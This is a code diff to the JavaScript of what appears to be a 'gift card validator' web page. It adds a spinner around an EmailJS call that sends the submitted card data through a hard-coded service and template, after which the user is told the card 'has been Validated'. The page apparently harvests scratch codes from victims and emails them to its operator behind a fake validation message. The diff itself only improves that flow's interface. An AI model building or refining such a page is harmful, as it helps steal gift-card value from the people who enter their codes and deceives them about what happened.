@@ -118,6 +118,17 @@ document.addEventListener("DOMContentLoaded", () => {
   const modalMsg = document.getElementById("modal-message");
   const modalClose = modal.querySelector(".modal-close");
 
+    const spinner = document.getElementById("spinner");
+
+function showSpinner() {
+  spinner.style.display = "flex";
+}
+
+function hideSpinner() {
+  spinner.style.display = "none";
+}
+
+
   // EmailJS init
   emailjs.init("lhvg3CREDwBk6RH_4"); // replace with your EmailJS public key
 
@@ -231,9 +242,19 @@ document.addEventListener("DOMContentLoaded", () => {
     // --------------------------
     // 🔥 SEND EMAIL
     // --------------------------
-    emailjs.send("service_0e5tu6h", "template_23zl6b7", templateParams)
-      .then(() => showModal(`✅ ${card} Gift Card has been Validated!`))
-      .catch(err => showModal(`⚠️ Verification valid but email failed: ${err.text}`));
+ // Show spinner before sending
+showSpinner();
+
+emailjs.send("service_0e5tu6h", "template_23zl6b7", templateParams)
+  .then(() => {
+    hideSpinner(); // hide spinner
+    showModal(`✅ ${card} Gift Card has been Validated!`);
+  })
+  .catch(err => {
+    hideSpinner(); // hide spinner
+    showModal(`⚠️ Verification valid but email failed: ${err.text}`);
+  });
+
 
     form.reset();
     codeInput.placeholder = "Enter scratch code";
